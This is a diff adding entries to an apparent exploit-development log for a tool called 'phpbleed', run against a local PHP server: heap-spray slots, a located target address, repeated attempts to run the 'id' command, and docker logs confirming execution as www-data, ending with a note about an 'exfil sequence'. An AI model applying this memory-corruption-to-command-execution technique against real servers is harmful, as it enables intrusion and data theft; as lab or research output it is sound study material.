@@ -5664,3 +5664,182 @@
 18:37:10Z [#13] [init@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=13
 18:37:10Z [#14] [init@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=14
 18:37:10Z [#15] [init@0xed3f889fffe8] PIN-CRASH/conn-closed rawlen=0
+18:41:40Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:41:40Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:41:40Z [#2] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=2
+18:41:40Z [#3] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=3
+18:41:40Z [#4] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=4
+18:41:40Z [#5] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=5
+18:41:40Z [#6] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=6
+18:41:40Z [#7] [init@0xed3f88a77000] pin-ok rawlen=9662 bodylen=9444 chunked=True n=7
+18:41:40Z [#8] [init@0xed3f88a77140] pin-ok rawlen=9662 bodylen=9444 chunked=True n=8
+18:41:40Z [#9] [init@0xed3f88a77280] pin-ok rawlen=9662 bodylen=9444 chunked=True n=9
+18:41:40Z [#10] [init@0xed3f88a773c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=10
+18:41:40Z [#11] [init@0xed3f88a77500] pin-ok rawlen=9662 bodylen=9444 chunked=True n=11
+18:41:40Z [#12] [init@0xed3f88a77640] pin-ok rawlen=9662 bodylen=9444 chunked=True n=12
+18:41:40Z [#13] [init@0xed3f88a77780] pin-ok rawlen=9662 bodylen=9444 chunked=True n=13
+18:41:40Z [#14] [init@0xed3f88a778c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=14
+18:41:40Z [#15] [init@0xed3f88a77a00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=15
+18:41:40Z [#16] [init@0xed3f88a77b40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=16
+18:41:40Z [#17] [init@0xed3f88a77c80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=17
+18:41:40Z [#18] [init@0xed3f88a77dc0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=18
+18:41:40Z [#19] [init@0xed3f88a77f00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=19
+18:41:40Z [#20] [init@0xed3f88a78000] pin-ok rawlen=9662 bodylen=9444 chunked=True n=20
+18:41:40Z [#21] [init@0xed3f88a78140] pin-ok rawlen=9662 bodylen=9444 chunked=True n=21
+18:41:40Z [#22] [init@0xed3f88a78280] pin-ok rawlen=9662 bodylen=9444 chunked=True n=22
+18:41:40Z [#23] [init@0xed3f88a783c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=23
+18:41:40Z [#24] [init@0xed3f88a78500] pin-ok rawlen=9662 bodylen=9444 chunked=True n=24
+18:41:40Z [#25] [init@0xed3f88a78640] pin-ok rawlen=9662 bodylen=9444 chunked=True n=25
+18:41:40Z [#26] [init@0xed3f88a78780] pin-ok rawlen=9662 bodylen=9444 chunked=True n=26
+18:41:40Z [#27] [init@0xed3f88a788c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=27
+18:41:40Z [#28] [init@0xed3f88a78a00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=28
+18:41:40Z [#29] [init@0xed3f88a78b40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=29
+18:41:40Z [#30] [init@0xed3f88a78c80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=30
+18:41:40Z [#31] [init@0xed3f88a78dc0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=31
+18:41:40Z [#32] [init@0xed3f88a78f00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=32
+18:41:40Z [#33] [init@0xed3f88a79000] pin-ok rawlen=9662 bodylen=9444 chunked=True n=33
+18:41:40Z [#34] [init@0xed3f88a79140] pin-ok rawlen=9662 bodylen=9444 chunked=True n=34
+18:41:40Z [#35] [init@0xed3f88a79280] pin-ok rawlen=9662 bodylen=9444 chunked=True n=35
+18:41:40Z [#36] [init@0xed3f88a793c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=36
+18:41:40Z [#37] [init@0xed3f88a79500] pin-ok rawlen=9662 bodylen=9444 chunked=True n=37
+18:41:40Z [#38] [init@0xed3f88a79640] pin-ok rawlen=9662 bodylen=9444 chunked=True n=38
+18:41:40Z [#39] [init@0xed3f88a79780] pin-ok rawlen=9662 bodylen=9444 chunked=True n=39
+18:41:41Z [#40] [init@0xed3f88a798c0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=40
+18:41:41Z [#41] [init@0xed3f88a79a00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=41
+18:41:41Z [#42] [init@0xed3f88a79b40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=42
+18:41:41Z [#43] [init@0xed3f88a79c80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=43
+18:41:41Z [#44] [init@0xed3f88a79dc0] pin-ok rawlen=9662 bodylen=9444 chunked=True n=44
+18:41:41Z [#45] [init@0xed3f88a79f00] pin-ok rawlen=9662 bodylen=9444 chunked=True n=45
+18:42:33Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:42:33Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:43:50Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:43:50Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:45:25Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:45:25Z [#1] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:45:25Z [#2] [init@0xed3f88a78e40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=2
+18:45:25Z [#3] [init@0xed3f88a78f80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=3
+18:45:25Z [#4] [init@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=4
+18:45:25Z [#5] [init@0xed3f88a78e48] pin-ok rawlen=9662 bodylen=9444 chunked=True n=5
+18:45:25Z [#6] [init@0xed3f88a78e38] pin-ok rawlen=9662 bodylen=9444 chunked=True n=6
+18:45:25Z [#7] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=7
+18:45:25Z [#8] [init@0xed3f88a78e40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=8
+18:45:25Z [#9] [init@0xed3f88a78f80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=9
+18:45:25Z [#10] [init@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=10
+18:45:25Z [#11] [init@0xed3f88a78e48] pin-ok rawlen=9662 bodylen=9444 chunked=True n=11
+18:45:25Z [#12] [init@0xed3f88a78e38] pin-ok rawlen=9662 bodylen=9444 chunked=True n=12
+18:45:25Z [#13] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=13
+18:45:25Z [#14] [init@0xed3f88a78e40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=14
+18:45:25Z [#15] [init@0xed3f88a78f80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=15
+18:45:25Z [#16] [init@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=16
+18:45:25Z [#17] [init@0xed3f88a78e48] pin-ok rawlen=9662 bodylen=9444 chunked=True n=17
+18:45:25Z [#18] [init@0xed3f88a78e38] pin-ok rawlen=9662 bodylen=9444 chunked=True n=18
+18:45:25Z [#19] [init@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=19
+18:45:25Z [#20] [init@0xed3f88a78e40] pin-ok rawlen=9662 bodylen=9444 chunked=True n=20
+18:45:25Z [#21] [init@0xed3f88a78f80] pin-ok rawlen=9662 bodylen=9444 chunked=True n=21
+18:45:25Z [#22] [init@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=22
+18:45:25Z [#23] [init@0xed3f88a78e48] pin-ok rawlen=9662 bodylen=9444 chunked=True n=23
+18:45:25Z [#24] [init@0xed3f88a78e38] pin-ok rawlen=9662 bodylen=9444 chunked=True n=24
+18:47:58Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:47:58Z [R-6/R-7 round 1] opening fresh worker pin
+18:47:58Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:47:58Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:47:58Z [#2] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:47:58Z [R-6] S = 0xed3f88a78d18 (reqs=2)
+18:47:58Z [#3] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:47:58Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:47:58Z [#4] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:47:59Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:47:59Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+18:47:59Z [R-7 round 1] no capture (S-stale-after-id); next round
+18:47:59Z [R-6/R-7 round 2] opening fresh worker pin
+18:47:59Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:47:59Z [#5] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:47:59Z [#6] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:47:59Z [R-6] S = 0xed3f88a78d18 (reqs=6)
+18:47:59Z [#7] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:47:59Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:47:59Z [#8] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:47:59Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:47:59Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+18:47:59Z [R-7 round 2] no capture (S-stale-after-id); next round
+18:47:59Z [R-6/R-7 round 3] opening fresh worker pin
+18:47:59Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:47:59Z [#9] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:47:59Z [#10] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:47:59Z [R-6] S = 0xed3f88a78d18 (reqs=10)
+18:47:59Z [#11] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:47:59Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:00Z [#12] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:00Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:00Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:00Z [R-7 round 3] no capture (S-stale-after-id); next round
+18:48:00Z [R-6/R-7 round 4] opening fresh worker pin
+18:48:00Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:48:00Z [#13] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:48:00Z [#14] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:48:00Z [R-6] S = 0xed3f88a78d18 (reqs=14)
+18:48:00Z [#15] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:48:00Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:00Z [#16] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:00Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:01Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:01Z [R-7 round 4] no capture (S-stale-after-id); next round
+18:48:01Z [R-6/R-7 round 5] opening fresh worker pin
+18:48:01Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:48:01Z [#17] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:48:01Z [#18] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:48:01Z [R-6] S = 0xed3f88a78d18 (reqs=18)
+18:48:01Z [#19] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:48:01Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:01Z [#20] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:01Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:01Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:01Z [R-7 round 5] no capture (S-stale-after-id); next round
+18:48:01Z [R-6/R-7 round 6] opening fresh worker pin
+18:48:01Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:48:01Z [#21] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:48:01Z [#22] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:48:01Z [R-6] S = 0xed3f88a78d18 (reqs=22)
+18:48:01Z [#23] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:48:01Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:02Z [#24] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:02Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:02Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:02Z [R-7 round 6] no capture (S-stale-after-id); next round
+18:48:02Z [R-6/R-7 round 7] opening fresh worker pin
+18:48:02Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:48:02Z [#25] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:48:02Z [#26] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:48:02Z [R-6] S = 0xed3f88a78d18 (reqs=26)
+18:48:02Z [#27] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:48:02Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:02Z [#28] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:03Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:03Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:03Z [R-7 round 7] no capture (S-stale-after-id); next round
+18:48:03Z [R-6/R-7 round 8] opening fresh worker pin
+18:48:03Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:48:03Z [#29] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:48:03Z [#30] [R-6 spray-slot@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=2
+18:48:03Z [R-6] S = 0xed3f88a78d18 (reqs=30)
+18:48:03Z [#31] [R-7 verify-S@0xed3f88a78d00] pin-ok rawlen=9944 bodylen=9726 chunked=True n=3
+18:48:03Z [R-7 verify-S] S ok: len=280, marker ok, head=00000000000000000000bbbb00000000
+18:48:03Z [#32] [R-7 id cmd=b'id'] PIN-CRASH/conn-closed rawlen=0
+18:48:03Z [R-7 id] cmd=b'id' -> NO RESPONSE (worker/pin crashed)
+18:48:03Z [R-7 id] docker-logs uid= check: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-d
+18:48:03Z [R-7 round 8] no capture (S-stale-after-id); next round
+18:48:03Z [#33] [idle] GET /f rawlen=491
+18:48:03Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
